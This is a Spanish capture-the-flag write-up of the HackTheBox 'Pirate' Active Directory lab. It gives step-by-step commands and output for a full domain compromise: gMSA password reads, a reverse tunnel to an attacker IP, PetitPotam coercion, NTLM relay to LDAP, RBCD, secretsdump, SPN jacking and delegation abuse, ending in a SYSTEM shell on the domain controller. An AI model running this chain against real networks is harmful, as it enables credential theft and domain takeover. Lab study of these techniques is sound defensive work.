# HackTheBox - Pirate (Hard) - Writeup Completo

**SO:** Windows Server 2019 (Active Directory)  
**Dificultad:** Hard  
**Autor:** HTB  
**Fecha:** 4 de marzo de 2026  

## Resumen de la Cadena de Ataque

```
Cuentas Pre-2k → Lectura de contraseñas gMSA → Pivot con Ligolo → Coerción PetitPotam 
→ NTLM Relay a LDAP (--remove-mic) → RBCD → Secretsdump WEB01 
→ Contraseña en claro de a.white → ForceChangePassword a.white_adm 
→ SPN Jacking → Constrained Delegation w/ Protocol Transition → Domain Admin
```

## Topología de Red

```
┌─────────────┐         ┌──────────────────────┐         ┌─────────────────┐
│   KALI      │         │       DC01           │         │     WEB01       │
│ 10.10.xx.xx │────────▶│ 10.129.x.x          │         │ 192.168.100.2   │
│             │  VPN    │ 192.168.100.1         │◀───────▶│ Server Core     │
│             │◀────────│ (Dual-homed)          │ Interna │ SMB Signing OFF │
│             │  Directa│                      │         │                 │
│             │◀────────────────────────────────────────────┘                 
│             │  WEB01 puede llegar a Kali directamente por 10.10.xx.xx
└─────────────┘         └──────────────────────┘         
```

---

## 1. Enumeración

### Escaneo de Puertos

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Servicios clave en DC01:
- 53 (DNS), 88 (Kerberos), 135 (RPC), 389/636 (LDAP/S)
- 445 (SMB - signing **requerido**), 5985 (WinRM)

### Credenciales Iniciales

Credenciales proporcionadas: `pentest:<REDACTED>`

### Hallazgos Clave

- LDAP signing **NO enforceado** en DC01
- SMB signing **requerido** en DC01 pero **NO requerido** en WEB01

---

## 2. Cuentas de Equipo Pre-Windows 2000

Usando el módulo `pre2k` de NetExec, se descubrieron dos cuentas de equipo con contraseñas por defecto:

```bash
nxc smb <TARGET_IP> -u pentest -p '<PASSWORD>' -M pre2k
```

| Cuenta | Contraseña |
|--------|------------|
| MS01$  | ms01       |
| ES01$  | es01       |

---

## 3. Lectura de Contraseñas gMSA

MS01$ tiene `msDS-AllowedToRetrieveManagedPassword` sobre las cuentas gMSA. Primero, obtener un TGT para MS01$:

```bash
getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip <TARGET_IP>
export KRB5CCNAME=MS01\$.ccache
```

Luego leer las contraseñas gMSA:

```bash
nxc ldap <TARGET_IP> -u 'MS01$' -p 'ms01' --gmsa
```

| Cuenta gMSA         | NT Hash                          |
|----------------------|----------------------------------|
| gMSA_ADFS_prod$      | `<REDACTED>` |
| gMSA_ADCS_prod$      | `<REDACTED>` |

---

## 4. Pivoteo con Ligolo-ng

### Descubrimiento de la Red Interna

Conectando a DC01 con gMSA_ADFS_prod$ se descubre una configuración dual-homed:

```bash
evil-winrm -i <TARGET_IP> -u 'gMSA_ADFS_prod$' -H '<GMSA_HASH>'
```

DC01 tiene una segunda NIC en `192.168.100.1/24`.

### Montaje del Túnel

**Kali (proxy):**
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:11601
```

**DC01 (agente):**
```powershell
.\agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert
```

**Consola de Ligolo:**
```
session    # seleccionar sesión de DC01
start
listener_add --addr 192.168.100.1:11601 --to <ATTACKER_IP>:11601
```

### Descubrimiento en la Red Interna

```bash
nmap -sV -p 445,80,5985,135 192.168.100.2
```

WEB01 (192.168.100.2):
- Windows Server 2019 Build 17763 (Server Core)
- **SMB signing deshabilitado** ← objetivo para relay
- IIS en puerto 80
- WinRM en 5985

---

## 5. NTLM Relay: Coerción PetitPotam → LDAP

### Descubrimiento Crítico

WEB01 puede llegar directamente a la IP VPN de Kali — no hace falta relayear a través de DC01:

```powershell
# Desde WEB01 vía evil-winrm
$t = New-Object Net.Sockets.TcpClient
$t.Connect("<ATTACKER_IP>", 445)
# Resultado: ABIERTO
```

### Preparación del Relay

**Paso 1 - Parar el servicio SMB de Kali:**
```bash
sudo systemctl stop smbd nmbd
```

**Paso 2 - Levantar ntlmrelayx apuntando al LDAP de DC01:**
```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -t ldap://192.168.100.1 \
  --remove-mic \
  --no-wcf-server \
  -smb2support \
  -i
```

El flag `--remove-mic` es imprescindible para relay cross-protocol SMB→LDAP.  
El flag `-i` abre un LDAP shell interactivo.

**Paso 3 - Forzar a WEB01 a autenticarse contra Kali:**
```bash
python3 PetitPotam.py \
  -u 'gMSA_ADFS_prod$' \
  -hashes ':<GMSA_HASH>' \
  -d pirate.htb \
  <ATTACKER_IP> 192.168.100.2
```

### Resultado

```
[*] (SMB): Authenticating PIRATE/WEB01$ against ldap://192.168.100.1 SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
```

---

## 6. Configuración de RBCD vía LDAP Shell

Conectar al LDAP shell interactivo:

```bash
nc 127.0.0.1 11000
```

Configurar Resource-Based Constrained Delegation — permitir que MS01$ suplante usuarios en WEB01$:

```
# set_rbcd WEB01$ MS01$
Found Target DN: CN=WEB01,CN=Computers,DC=pirate,DC=htb
Found Grantee DN: CN=MS01,CN=Computers,DC=pirate,DC=htb
Delegation rights modified successfully!
MS01$ can now impersonate users on WEB01$ via S4U2Proxy
```

---

## 7. S4U2Proxy → Administrator en WEB01

Solicitar un ticket de servicio suplantando a Administrator para CIFS en WEB01:

```bash
sudo ntpdate -u <TARGET_IP>  # sincronizar reloj primero

python3 getST.py \
  -spn cifs/WEB01.pirate.htb \
  -impersonate Administrator \
  -dc-ip 192.168.100.1 \
  'pirate.htb/MS01$:ms01'
```

```
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

---

## 8. Secretsdump en WEB01 → Credenciales de a.white

```bash
export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache

python3 secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb
```

### Hallazgos

| Secreto | Valor |
|---------|-------|
| Hash Admin local | `<REDACTED>` |
| Hash WEB01$ | `<REDACTED>` |
| **a.white en claro** | **`<REDACTED>`** |

La contraseña en texto claro estaba almacenada en LSA Secrets (`DefaultPassword` — auto-logon configurado).

---

## 9. ForceChangePassword: a.white → a.white_adm

BloodHound muestra que `a.white` tiene derechos `ForceChangePassword` sobre `a.white_adm`.

```bash
net rpc password 'a.white_adm' '<NEW_PASSWORD>' \
  -U 'pirate.htb/a.white%<PASSWORD>' \
  -S 192.168.100.1
```

Verificar:
```bash
nxc smb 192.168.100.1 -u 'a.white_adm' -p '<NEW_PASSWORD>' -d pirate.htb
# [+] pirate.htb\a.white_adm:<NEW_PASSWORD>
```

---

## 10. Constrained Delegation + SPN Jacking → Domain Admin

### Descubrimiento de Delegación

```bash
python3 findDelegation.py 'pirate.htb/a.white_adm:<PASSWORD>' -dc-ip 192.168.100.1
```

```
a.white_adm  Person  Constrained w/ Protocol Transition  HTTP/WEB01.pirate.htb
```

`a.white_adm` puede delegar a `HTTP/WEB01.pirate.htb` con protocol transition.  
`a.white_adm` también tiene derechos **WriteSPN** sobre `DC01$`.

### SPN Jacking

Mover el SPN `HTTP/WEB01.pirate.htb` de WEB01$ a DC01$:

```python
import ldap3

server = ldap3.Server('192.168.100.1', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='pirate.htb\\a.white_adm', 
                        password='<PASSWORD>', authentication=ldap3.NTLM, auto_bind=True)

# Eliminar SPN de WEB01$
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb', 
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01.pirate.htb'])]})

# Añadir SPN a DC01$
conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb', 
    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/WEB01.pirate.htb'])]})
```

Ahora el KDC cree que `HTTP/WEB01.pirate.htb` pertenece a DC01.

### KCD con altservice

```bash
python3 getST.py \
  -spn HTTP/WEB01.pirate.htb \
  -impersonate Administrator \
  -altservice CIFS/DC01.pirate.htb \
  -dc-ip 192.168.100.1 \
  'pirate.htb/a.white_adm:<PASSWORD>'
```

```
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

El ticket está cifrado con la clave de DC01$, así que DC01 lo acepta como válido.

---

## 11. Shell SYSTEM en DC01

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache

python3 psexec.py -k -no-pass \
  -dc-ip 192.168.100.1 \
  -target-ip 192.168.100.1 \
  pirate.htb/Administrator@DC01.pirate.htb
```

```
Microsoft Windows [Version 10.0.17763.8385]
C:\Windows\system32> whoami
nt authority\system
```

---

## Flags

| Flag | Hash |
|------|------|
| User (a.white en WEB01) | `<REDACTED>` |
| Root (Administrator en DC01) | `<REDACTED>` |

---

## Credenciales Recolectadas

| Cuenta | Tipo | Valor |
|--------|------|-------|
| pentest | Contraseña | `<REDACTED>` |
| MS01$ | Contraseña | `<REDACTED>` |
| ES01$ | Contraseña | `<REDACTED>` |
| gMSA_ADFS_prod$ | NT Hash | `<REDACTED>` |
| gMSA_ADCS_prod$ | NT Hash | `<REDACTED>` |
| WEB01 Admin local | NT Hash | `<REDACTED>` |
| WEB01$ | NT Hash | `<REDACTED>` |
| a.white | Contraseña | `<REDACTED>` |
| a.white_adm | Contraseña | `<REDACTED>` |

---

## Lecciones Aprendidas

1. **Testear conectividad de red es clave** — WEB01 podía llegar a Kali directamente, sin necesidad de port forwarding complejo a través de DC01
2. **`--remove-mic` es imprescindible** para relay cross-protocol SMB→LDAP en Windows Server 2019
3. **DefaultPassword en LSA Secrets** — las credenciales de auto-logon se almacenan en texto claro
4. **SPN Jacking** — si tienes WriteSPN sobre un objeto de equipo, puedes redirigir la constrained delegation a cualquier servicio de esa máquina moviendo el SPN
5. **`-altservice` en getST.py** — permite reescribir el nombre del servicio en el ticket, convirtiendo un ticket HTTP en uno CIFS para acceso con psexec
